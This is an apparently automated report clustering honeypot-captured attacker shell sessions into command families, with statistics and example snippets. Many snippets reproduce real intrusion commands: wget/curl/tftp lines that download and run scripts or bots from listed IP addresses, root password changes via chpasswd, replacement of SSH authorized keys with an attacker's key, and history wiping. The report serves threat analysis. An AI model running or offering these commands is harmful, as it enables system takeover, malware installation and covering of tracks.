# FS Families Report

Total Families: 35

## Family 0

- **Total Session Volume**: 6652
- **FI-Unique Archetypes**: 74
- **Mean FS**: 0.821 (±0.067)
- **Medoid Archetype**: `2205e63e85737b0a` (Session: `3bf3c2f2ef14`, n_rows=15)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo "root:EGlwrHvBpJxE"|chpasswd|bash
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
crontab -l
w
uname -m
cat /proc/cpuinfo | grep model | grep  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('grep', '|'), ('awk', ';'), ('crontab', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('uname', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&')]`

Top operators: [('grep', 444), ('cat', 222), ('uname', 222), ('echo', 172), ('wc', 148), ('awk', 148), ('cd', 148), ('bash', 74), ('head', 74), ('free', 74)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 992954da98b973cf | 000f4ed59ff6 |       15 |            5030 |
| 4154ec91189393c2 | 0033bd5af087 |       18 |            1106 |
| 04aa7f34bffa2c7f | 00614aeef8c2 |       15 |             272 |
| c4480d6b929fce3d | 0cf124907492 |       18 |              60 |
| 1f1c537a14873afe | 0d39c84302f5 |       18 |              49 |
| 0a2f50a2478e5fa7 | 107984dad0b7 |       18 |              17 |
| 76bd713ccdb4ecd1 | 0d8f74dea416 |       15 |              17 |
| d10f02978eeb1b1b | 3ae5f4ce5ca2 |       18 |               9 |
| 2205e63e85737b0a | 3bf3c2f2ef14 |       15 |               4 |
| 766841261505f76c | 894ff37e5ae1 |       15 |               4 |

---

## Family 4

- **Total Session Volume**: 613
- **FI-Unique Archetypes**: 3
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `146bfbf4066fd438` (Session: `0086aa97708e`, n_rows=1)

**Medoid Execution Snippet:**
```text
uname -a
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', 'EOS')]`

Top operators: [('uname', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 146bfbf4066fd438 | 0086aa97708e |        1 |             577 |
| c1f4de5103d6ebc1 | 03151365942e |        1 |              29 |
| ca7599047742b99a | 093da5fe86f1 |        1 |               7 |

---

## Family 32

- **Total Session Volume**: 191
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c0adbcc060a86bff` (Session: `005eed877604`, n_rows=1)

**Medoid Execution Snippet:**
```text
yum install wget -y; apt install wget -y;dnf install wget; pacman -S wget; cd /tmp; wget http://109.206.241.34/x86.sh; curl -O http://109.206.241.34/x86.sh; chmod 777 x86.sh; sh x86.sh microsoft
```

**Consensus Skeleton (op, conn pairs):**
`[('yum', ';'), ('apt', ';'), ('dnf', ';'), ('pacman', ';'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', 'EOS')]`

Top operators: [('yum', 1), ('apt', 1), ('dnf', 1), ('pacman', 1), ('cd', 1), ('wget', 1), ('curl', 1), ('chmod', 1), ('sh', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c0adbcc060a86bff | 005eed877604 |        1 |             191 |

---

## Family 9

- **Total Session Volume**: 41
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `a5b2e002ac0fcb8a` (Session: `148d84de6a46`, n_rows=1)

**Medoid Execution Snippet:**
```text
echo -e '\x67\x61\x79\x66\x67\x74'
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', 'EOS')]`

Top operators: [('echo', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c174d59494746fd6 | 1108f7db266c |        1 |              39 |
| a5b2e002ac0fcb8a | 148d84de6a46 |        1 |               2 |

---

## Family 18

- **Total Session Volume**: 37
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `4bbb278ccbbbd1d8` (Session: `03c774096880`, n_rows=1)

**Medoid Execution Snippet:**
```text
yum install wget -y; apt install wget -y; cd /tmp; wget http://79.133.109.151/ssh.sh; curl -O http://79.133.109.151/ssh.sh; chmod 777 ssh.sh; sh ssh.sh; tftp 79.133.109.151 -c get ssh1.sh; chmod 777 ssh1.sh; sh ssh1.sh; tftp -r ssh2.sh -g 79.133.109.151; chmod 777 ssh2.sh; sh ssh2.sh; rm -rf ssh.sh  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('yum', ';'), ('apt', ';'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', 'EOS')]`

Top operators: [('chmod', 3), ('sh', 3), ('tftp', 2), ('yum', 1), ('apt', 1), ('cd', 1), ('wget', 1), ('curl', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 4bbb278ccbbbd1d8 | 03c774096880 |        1 |              37 |

---

## Family 6

- **Total Session Volume**: 35
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9e130f6dca55feed` (Session: `120903b9d642`, n_rows=1)

**Medoid Execution Snippet:**
```text
cd /tmp; wget http://109.239.48.81/ok.sh; curl -o ok.sh http://109.239.48.81/ok.sh; chmod 777 ok.sh; ./ok.sh; rm -rf ok.sh; history -c
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('cd', 1), ('wget', 1), ('curl', 1), ('chmod', 1), ('PH_EXEC_2', 1), ('rm', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9e130f6dca55feed | 120903b9d642 |        1 |              35 |

---

## Family 7

- **Total Session Volume**: 32
- **FI-Unique Archetypes**: 5
- **Mean FS**: 0.936 (±0.029)
- **Medoid Archetype**: `01b0b8cae49a7ff9` (Session: `4866aa828c0d`, n_rows=30)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('which', ';'), ('ls', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', 'EOS')]`

Top operators: [('grep', 55), ('uname', 30), ('cat', 25), ('awk', 20), ('wc', 15), ('echo', 13), ('cd', 10), ('head', 10), ('free', 10), ('which', 10)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| eda8068f20f5eede | 04415a2d3eba |       27 |              22 |
| 01b0b8cae49a7ff9 | 4866aa828c0d |       30 |               5 |
| 3bcc7191e75f5bd3 | 75f078db5d6a |       27 |               3 |
| 9c1c5bdd9108bc29 | 45e8b17451d5 |       30 |               1 |
| ee9ccbc4d1cdd37c | f304f92bd5bf |       30 |               1 |

---

## Family 20

- **Total Session Volume**: 32
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `d71ff511c3648464` (Session: `0bb36137bbc3`, n_rows=2)

**Medoid Execution Snippet:**
```text
lspci | grep -i --color vga\|3d\|2d
uname -a;lspci | grep -i --color 'vga\|3d\|2d';curl -s -L http://39.165.53.17:8088/iposzz/dred -o /tmp/dred;perl /tmp/dred
```

**Consensus Skeleton (op, conn pairs):**
`[('lspci', '|'), ('grep', ';'), ('uname', ';'), ('lspci', '|'), ('grep', ';'), ('curl', ';'), ('perl', 'EOS')]`

Top operators: [('lspci', 2), ('grep', 2), ('uname', 1), ('curl', 1), ('perl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d71ff511c3648464 | 0bb36137bbc3 |        2 |              32 |

---

## Family 3

- **Total Session Volume**: 15
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.900 (±0.000)
- **Medoid Archetype**: `16f7ee176f1fff82` (Session: `08a909a2b48c`, n_rows=26)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
Enter new UNIX password: 
Enter new UNIX password:
echo -e "Server2016\nXxE8swrjeYEl\nXxE8swrjeYEl"|passwd|bash
echo "Server2016\nXxE8swrjeYEl\nXxE8swrjeYEl\n"|passwd
echo "321" > /var/tmp/.var03522123
rm -rf /var/tmp/.var03522123
cat /var/tmp/.var03522123 | hea ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('bash', ';'), ('echo', ';'), ('rm', ';'), ('cat', '|'), ('head', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('which', ';'), ('ls', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('echo', ';'), ('rm', ';'), ('cat', ';'), ('echo', ';'), ('cat', ';'), ('sleep', '&&'), ('cd', ';'), ('echo', '|'), ('base64', '|'), ('bash', 'EOS')]`

Top operators: [('cat', 12), ('grep', 12), ('echo', 11), ('uname', 6), ('wc', 4), ('bash', 4), ('rm', 4), ('head', 4), ('awk', 4), ('Enter', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| cdf071ebfec325cd | 1942a3b2d306 |       23 |              12 |
| 16f7ee176f1fff82 | 08a909a2b48c |       26 |               3 |

---

## Family 2

- **Total Session Volume**: 11
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.847 (±0.068)
- **Medoid Archetype**: `d28fbc792769458e` (Session: `19de512cd1be`, n_rows=19)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo "root:L0vFeBocnvWd"|chpasswd|bash
echo "321" > /var/tmp/.var03522123
rm -rf /var/tmp/.var03522123
cat /var/tmp/.var03522123 | head -n 1
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|')]`

Top operators: [('grep', 24), ('cat', 15), ('echo', 12), ('uname', 12), ('wc', 8), ('awk', 8), ('head', 7), ('rm', 6), ('Enter', 4), ('passwd', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d28fbc792769458e | 19de512cd1be |       19 |               7 |
| 4ce6ad639465b6d0 | f3b0522214cd |       22 |               2 |
| ea2dd7eb2097a6b5 | c9cdd14acdbf |       19 |               1 |
| eda6875e06926895 | 388f2d5d3baf |       17 |               1 |

---

## Family 5

- **Total Session Volume**: 11
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `f99a1c7cba0a5e2c` (Session: `1d7630fd1282`, n_rows=1)

**Medoid Execution Snippet:**
```text
cd /tmp ; wget 185.237.15.90/ok.sh ; sh ok.sh ; rm -rf ok.sh ; curl -O 185.237.15.90/ok.sh ; sh ok.sh ; rm -rf ok.sh ; history -c
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('sh', ';'), ('rm', ';'), ('curl', ';'), ('sh', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('sh', 2), ('rm', 2), ('cd', 1), ('wget', 1), ('curl', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f99a1c7cba0a5e2c | 1d7630fd1282 |        1 |              11 |

---

## Family 17

- **Total Session Volume**: 10
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `5aa9fc078d1c6ac7` (Session: `3775c590fb0b`, n_rows=9)

**Medoid Execution Snippet:**
```text
/ip cloud print
/ip cloud print
ifconfig
uname -a
cat /proc/cpuinfo
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
echo Hi | ...
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('PH_EXEC_1', ';'), ('ifconfig', ';'), ('uname', ';'), ('cat', ';'), ('ps', '|'), ('grep', ';'), ('ps', '|'), ('grep', ';'), ('ls', ';'), ('echo', '|'), ('cat', 'EOS')]`

Top operators: [('PH_EXEC_1', 2), ('cat', 2), ('ps', 2), ('grep', 2), ('ifconfig', 1), ('uname', 1), ('ls', 1), ('echo', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5aa9fc078d1c6ac7 | 3775c590fb0b |        9 |              10 |

---

## Family 21

- **Total Session Volume**: 10
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b6d5ec625261382a` (Session: `013ec1febe53`, n_rows=1)

**Medoid Execution Snippet:**
```text
(uname -smr || /bin/uname -smr || /usr/bin/uname -smr)
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', '||'), ('uname', '||'), ('uname', 'EOS')]`

Top operators: [('uname', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b6d5ec625261382a | 013ec1febe53 |        1 |              10 |

---

## Family 12

- **Total Session Volume**: 8
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `dc1d34fa7358d80a` (Session: `0e6e2b766d56`, n_rows=2)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', '|'), ('head', 'EOS')]`

Top operators: [('cd', 2), ('rm', 1), ('mkdir', 1), ('echo', 1), ('chmod', 1), ('cat', 1), ('grep', 1), ('wc', 1), ('head', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| dc1d34fa7358d80a | 0e6e2b766d56 |        2 |               8 |

---

## Family 1

- **Total Session Volume**: 7
- **FI-Unique Archetypes**: 7
- **Mean FS**: 0.860 (±0.056)
- **Medoid Archetype**: `46f65e8e94e51176` (Session: `0070d43c1d4c`, n_rows=15)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo "root:eMCipfScd1Gb"|chpasswd|bash
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
crontab -l
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
w
uname -m
cat /proc/cpuinfo | grep model | grep  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]`

Top operators: [('grep', 41), ('uname', 21), ('cat', 20), ('wc', 14), ('echo', 14), ('cd', 14), ('awk', 13), ('chpasswd', 7), ('bash', 7), ('ls', 7)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2ba6b373496c3365 | 4d25bfbb5a5a |       15 |               1 |
| 3186731d62131329 | 2b2a56ef9c06 |       14 |               1 |
| 46f65e8e94e51176 | 0070d43c1d4c |       15 |               1 |
| 4ee600f4839891c6 | b416f9f6985a |       15 |               1 |
| 72c83f653b0098d0 | 183f3963df46 |       15 |               1 |
| ddaa730ce79d78c7 | 59f1f0ef85a6 |       15 |               1 |
| effb9a506dd4a372 | a14b91fd7a01 |       15 |               1 |

---

## Family 19

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9557a08d49ad1c58` (Session: `3c4cc4476254`, n_rows=4)

**Medoid Execution Snippet:**
```text
#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://23.235.171.196:88/112; curl -O http://23.235.171.196:88/112; chmod +x 112; ./112; rm -rf 123.sh; history -c; 
/bin/eyshcjdmzg
/bin/eyshcjdmzg
ls -la /var/run/gcc.pid
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('PH_EXEC_1', ';'), ('ls', 'EOS')]`

Top operators: [('PH_EXEC_1', 2), ('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9557a08d49ad1c58 | 3c4cc4476254 |        4 |               3 |

---

## Family 26

- **Total Session Volume**: 3
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `a5493342abd99d02` (Session: `78a9c59b372f`, n_rows=6)

**Medoid Execution Snippet:**
```text
wget -qO - http://147.231.19.62/.x/1sh | sh > /dev/null 2>&1 &
rm -rf /var/run/1sh; wget -c http://147.231.19.62/.x/1sh -P /var/run && sh /var/run/1sh &
wget -qO - http://147.231.19.62/.x/2sh | sh > /dev/null 2>&1 &
rm -rf /tmp/2sh; wget -c http://147.231.19.62/.x/2sh -P /tmp && sh /tmp/2sh &
curl h ...
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', '|'), ('sh', ';'), ('rm', ';'), ('wget', '&&'), ('sh', ';'), ('wget', '|'), ('sh', ';'), ('rm', ';'), ('wget', '&&'), ('sh', ';'), ('curl', '|'), ('sh', ';'), ('cd', ';'), ('rm', ';'), ('tftp', ';'), ('sh', 'EOS')]`

Top operators: [('sh', 6), ('wget', 4), ('rm', 3), ('curl', 1), ('cd', 1), ('tftp', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a5493342abd99d02 | 78a9c59b372f |        6 |               3 |

---

## Family 29

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `04e69dfa706ed06a` (Session: `40896c08b1b1`, n_rows=1)

**Medoid Execution Snippet:**
```text
nproc;curl -O 5.161.51.216/bot;perl bot;mv bot /
```

**Consensus Skeleton (op, conn pairs):**
`[('nproc', ';'), ('curl', ';'), ('perl', ';'), ('mv', 'EOS')]`

Top operators: [('nproc', 1), ('curl', 1), ('perl', 1), ('mv', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 04e69dfa706ed06a | 40896c08b1b1 |        1 |               2 |

---

## Family 22

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `c817debf27c42b8c` (Session: `2802296328de`, n_rows=2)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo;
wget http://80.94.92.49/d -O-|sh;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('wget', '|'), ('sh', 'EOS')]`

Top operators: [('cat', 1), ('wget', 1), ('sh', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c817debf27c42b8c | 2802296328de |        2 |               2 |

---

## Family 33

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `03fe6867234ddcce` (Session: `84503eee7a27`, n_rows=2)

**Medoid Execution Snippet:**
```text
uname -a;lspci | grep -i --color 'vga\|3d\|2d';curl -s -L http://39.165.53.17:8088/iposzz/dred -o /tmp/dred;perl /tmp/dred
lspci | grep -i --color vga\|3d\|2d
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('lspci', '|'), ('grep', ';'), ('curl', ';'), ('perl', ';'), ('lspci', '|'), ('grep', 'EOS')]`

Top operators: [('lspci', 2), ('grep', 2), ('uname', 1), ('curl', 1), ('perl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 03fe6867234ddcce | 84503eee7a27 |        2 |               1 |

---

## Family 28

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0c710b5fdab4f210` (Session: `efa5ebd35f3d`, n_rows=18)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo -e "admanager\npTQCT4ubSSY3\npTQCT4ubSSY3"|passwd|bash
Enter new UNIX password:
Enter new UNIX password: 
echo "admanager\npTQCT4ubSSY3\npTQCT4ubSSY3\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
ls -lh $(which ls)
w ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('Enter', ';'), ('Enter', ';'), ('echo', '|'), ('passwd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('top', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]`

Top operators: [('grep', 6), ('cat', 3), ('echo', 3), ('uname', 3), ('wc', 2), ('passwd', 2), ('Enter', 2), ('awk', 2), ('cd', 2), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0c710b5fdab4f210 | efa5ebd35f3d |       18 |               1 |

---

## Family 23

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0ffdeb3c37d479de` (Session: `9d84e2948414`, n_rows=10)

**Medoid Execution Snippet:**
```text
uname -a
uname -m
top
w
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
free -m
ls -lh $(which ls) 
which ls
cat /proc/cpuinfo | grep name | wc -l
lscpu | grep Model
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('uname', ';'), ('top', ';'), ('w', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('free', ';'), ('ls', ';'), ('which', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('lscpu', '|'), ('grep', 'EOS')]`

Top operators: [('grep', 3), ('uname', 2), ('free', 2), ('top', 1), ('w', 1), ('awk', 1), ('ls', 1), ('which', 1), ('cat', 1), ('wc', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0ffdeb3c37d479de | 9d84e2948414 |       10 |               1 |

---

## Family 31

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `28bf5d09cc071b0a` (Session: `30828d44e962`, n_rows=1)

**Medoid Execution Snippet:**
```text
head -1 /proc/meminfo; nproc; ulimit -u; sudo -V | grep -c "Sudo version"
```

**Consensus Skeleton (op, conn pairs):**
`[('head', ';'), ('nproc', ';'), ('ulimit', ';'), ('sudo', '|'), ('grep', 'EOS')]`

Top operators: [('head', 1), ('nproc', 1), ('ulimit', 1), ('sudo', 1), ('grep', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 28bf5d09cc071b0a | 30828d44e962 |        1 |               1 |

---

## Family 25

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `52cb75d10f744e62` (Session: `3afbd3c66eab`, n_rows=1)

**Medoid Execution Snippet:**
```text
lscpu
```

**Consensus Skeleton (op, conn pairs):**
`[('lscpu', 'EOS')]`

Top operators: [('lscpu', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 52cb75d10f744e62 | 3afbd3c66eab |        1 |               1 |

---

## Family 27

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `59111258620bd04f` (Session: `2495304db2b6`, n_rows=11)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo -e "p4sSw0rd\ntbJrM6NI9uF2\ntbJrM6NI9uF2"|passwd|bash
Enter new UNIX password:
Enter new UNIX password: 
echo "p4sSw0rd\ntbJrM6NI9uF2\ntbJrM6NI9uF2\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | a ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('Enter', ';'), ('Enter', ';'), ('echo', '|'), ('passwd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('which', ';'), ('ls', ';'), ('crontab', ';'), ('w', 'EOS')]`

Top operators: [('grep', 3), ('cat', 2), ('echo', 2), ('passwd', 2), ('Enter', 2), ('awk', 2), ('wc', 1), ('bash', 1), ('head', 1), ('free', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
